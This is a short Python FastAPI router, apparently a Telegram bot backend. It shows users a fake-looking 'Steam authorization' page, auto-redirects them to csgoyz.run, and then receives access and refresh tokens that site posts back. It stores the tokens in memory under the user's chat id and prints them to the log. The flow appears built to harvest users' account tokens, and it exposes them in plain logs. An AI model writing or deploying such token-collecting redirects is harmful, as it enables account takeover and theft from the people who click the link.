from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse

router = APIRouter()

SELF = "https://tg-bot-test-gkbp.onrender.com"

RAM_DATA = {}

# 1️⃣ старт авторизации — промежуточная страница на нашем домене
@router.get("/auth/start")
async def auth_start(chat_id: int):
    """
    Пользователь открывает ссылку -> открывается промежуточная страница
    -> автоматически редирект на csgoyz.run с callback на наш домен.
    """
    tg_callback = f"{SELF}/auth/receive?chat_id={chat_id}"
    csgoyz_url = f"https://csgoyz.run/?tg_callback={tg_callback}"

    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head>
<title>Авторизация Steam</title>
<style>
body {{ font-family: Arial; background:#0f1117; color:white; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }}
.container {{ text-align:center; }}
</style>
</head>
<body>
<div class="container">
<h2>🔐 Пожалуйста, дождитесь окончания авторизации...</h2>
<p>Через секунду вы будете перенаправлены на страницу входа через Steam.</p>
</div>

<script>
setTimeout(() => {{
    window.location.href = "{csgoyz_url}";
}}, 1000);  // редирект через 1 секунду
</script>
</body>
</html>
""")

# 2️⃣ приём токенов после возвращения с csgoyz.run
@router.post("/auth/receive")
async def auth_receive(request: Request, chat_id: int):
    """
    Сюда csgoyz.run отправляет токены через fetch.
    """
    data = await request.json()

    RAM_DATA.setdefault(chat_id, {})
    RAM_DATA[chat_id]["access"] = data.get("token")
    RAM_DATA[chat_id]["refresh"] = data.get("refresh")

    print("🔥 TOKENS:", chat_id, RAM_DATA[chat_id])
    return JSONResponse({"ok": True})